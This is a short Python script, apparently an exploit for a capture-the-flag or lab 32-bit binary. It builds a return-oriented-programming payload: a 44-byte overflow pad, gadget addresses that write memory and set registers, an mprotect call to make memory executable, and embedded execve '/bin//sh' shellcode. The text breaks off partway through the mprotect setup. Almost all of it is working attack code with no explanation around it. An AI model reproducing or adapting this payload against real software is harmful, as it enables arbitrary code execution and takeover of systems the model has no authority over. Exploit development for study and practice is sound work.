import struct



def cpymem(dst, val, dstcorrect=0):

    popebx = 0x0805249e # dst

    popedx = 0x08052476 # val

    decebx = 0x0804f871 # dec ebx; ret

    movebxedx = 0x08052393 # mov [ebx], edx; add [eax], al; ret



    if dstcorrect>0:

        dst += dstcorrect

    payload = struct.pack('I', popebx)

    payload += struct.pack('I', dst)



    for i in range(0, dstcorrect):

        payload += struct.pack('I', decebx)



    payload += struct.pack('I', popedx)

    payload += struct.pack('I', val)



    payload += struct.pack('I', movebxedx)



    return payload



eip_position = 44

mprotect = 0x08052290

target_memory = 0x08048000



shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'



payload = 'A' * eip_position



# setup for mprotect



# get 0x2000 into ecx

payload += struct.pack('I', 0x080658d7) # pop ecx; adc al, 0x89; ret

payload += struct.pack('I', 0xffffffff)

payload += struct.pack('I', 0x08083c16) # inc ecx; adc al, 0x39
